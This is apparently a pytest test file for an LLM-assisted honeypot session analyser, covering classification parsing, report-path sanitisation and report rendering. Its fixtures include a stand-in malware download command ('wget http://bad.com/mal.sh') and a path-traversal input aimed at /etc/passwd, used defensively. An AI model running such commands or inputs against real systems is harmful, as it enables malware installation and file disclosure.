"""Unit tests for analysis_agent nodes. No LLM credentials required — all calls are mocked."""
import asyncio
import dataclasses
import json
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from agent.state import SessionAnalysisState
from agent.nodes.classify import _parse_classify
from agent.nodes.output import _render_report, _report_path

FIXTURE_DIR = Path(__file__).parent / "fixtures"


# ── _parse_classify ────────────────────────────────────────────────────────────

class TestParseClassify:
    def test_parses_all_fields(self):
        text = "attack_type: botnet\nseverity: high\nttps: brute-force, dropper-download"
        at, sev, ttps = _parse_classify(text)
        assert at == "botnet"
        assert sev == "high"
        assert ttps == ["brute-force", "dropper-download"]

    def test_defaults_on_empty_response(self):
        at, sev, ttps = _parse_classify("")
        assert at == "unknown"
        assert sev == "medium"
        assert ttps == []

    def test_case_insensitive(self):
        text = "Attack_Type: Scanner\nSeverity: LOW\nTTPs: port-scan"
        at, sev, ttps = _parse_classify(text)
        assert at == "scanner"
        assert sev == "low"
        assert ttps == ["port-scan"]

    def test_partial_response(self):
        text = "attack_type: worm"
        at, sev, ttps = _parse_classify(text)
        assert at == "worm"
        assert sev == "medium"
        assert ttps == []


# ── _report_path sanitisation ─────────────────────────────────────────────────

class TestReportPath:
    def test_safe_session_id(self):
        p = _report_path("abc123")
        assert p.name == "abc123.md"

    def test_sanitises_special_chars(self):
        p = _report_path("../evil/../../etc/passwd")
        assert "/" not in p.name
        assert ".." not in p.name

    def test_sanitises_slashes(self):
        p = _report_path("session/with/slashes")
        assert p.name.endswith(".md")
        assert "/" not in p.name


# ── _render_report ────────────────────────────────────────────────────────────

class TestRenderReport:
    def _state(self, **kwargs) -> SessionAnalysisState:
        defaults = dict(
            session_id="s1",
            src_ip="1.2.3.4",
            country="Russia",
            asn_org="AS12345 Example ISP",
            hop=1,
            duration=45.0,
            command_count=5,
            commands=["whoami", "uname -a", "wget http://bad.com/mal.sh"],
            attack_type="botnet",
            severity="high",
            ttps=["brute-force", "dropper-download"],
            threat_context="Likely Mirai variant.",
            summary="Attacker downloaded malware.",
        )
        return SessionAnalysisState(**{**defaults, **kwargs})

    def test_contains_session_id(self):
        report = _render_report(self._state())
        assert "s1" in report

    def test_contains_src_ip(self):
        report = _render_report(self._state())
        assert "1.2.3.4" in report

    def test_contains_commands(self):
        report = _render_report(self._state())
        assert "whoami" in report

    def test_contains_summary(self):
        report = _render_report(self._state())
        assert "Attacker downloaded malware." in report

    def test_no_commands_handled(self):
        report = _render_report(self._state(commands=[]))
        assert "(none recorded)" in report


# ── ingest_node — no theater.db ───────────────────────────────────────────────

async def test_ingest_returns_done_when_no_db(tmp_path):
    from agent.nodes.ingest import ingest_node
    with patch("agent.nodes.ingest.THEATER_DB", tmp_path / "nonexistent.db"):
        with patch("agent.nodes.ingest.ANALYSIS_DB", tmp_path / "analysis.db"):
            state = await ingest_node(SessionAnalysisState())
    assert state.done is True


# ── classify_node — mocked LLM ───────────────────────────────────────────────

async def test_classify_node_calls_llm(tmp_path):
    from agent.nodes.classify import classify_node

    mock_resp = MagicMock()
    mock_resp.choices[0].message.content = (
        "attack_type: botnet\nseverity: high\nttps: brute-force"
    )

    state = SessionAnalysisState(
        session_id="s1", src_ip="1.2.3.4", country="China",
        asn_org="AS9999 ISP", hop=1, duration=30.0, command_count=3,
    )

    with patch("openai.AsyncOpenAI") as MockClient:
        instance = MockClient.return_value
        instance.chat.completions.create = AsyncMock(return_value=mock_resp)
        result = await classify_node(state)

    assert result.attack_type == "botnet"
    assert result.severity == "high"
    assert "brute-force" in result.ttps


async def test_classify_node_skips_when_done():
    from agent.nodes.classify import classify_node
    state = SessionAnalysisState(done=True, session_id="s1")
    result = await classify_node(state)
    assert result.done is True
    assert result.attack_type == ""


async def test_classify_node_handles_llm_error():
    from agent.nodes.classify import classify_node
    state = SessionAnalysisState(session_id="s1", src_ip="1.2.3.4")

    with patch("openai.AsyncOpenAI") as MockClient:
        instance = MockClient.return_value
        instance.chat.completions.create = AsyncMock(side_effect=RuntimeError("timeout"))
        result = await classify_node(state)

    assert result.error is not None
    assert "timeout" in result.error


# ── output_node — writes report file ─────────────────────────────────────────

async def test_output_node_writes_file(tmp_path):
    from agent.nodes.output import output_node

    state = SessionAnalysisState(
        session_id="outtest",
        src_ip="5.5.5.5",
        country="Germany",
        asn_org="AS1234",
        hop=2,
        duration=60.0,
        command_count=4,
        commands=["ls", "id"],
        attack_type="targeted",
        severity="medium",
        ttps=["recon"],
        threat_context="None known.",
        summary="Attacker ran recon commands.",
    )

    with patch("agent.nodes.output.REPORTS_DIR", tmp_path / "reports"):
        with patch("agent.nodes.output.ANALYSIS_DB", tmp_path / "analysis.db"):
            with patch("agent.nodes.ingest.ANALYSIS_DB", tmp_path / "analysis.db"):
                result = await output_node(state)

    assert result.done is True
    report = (tmp_path / "reports" / "outtest.md")
    assert report.exists()
    assert "5.5.5.5" in report.read_text()
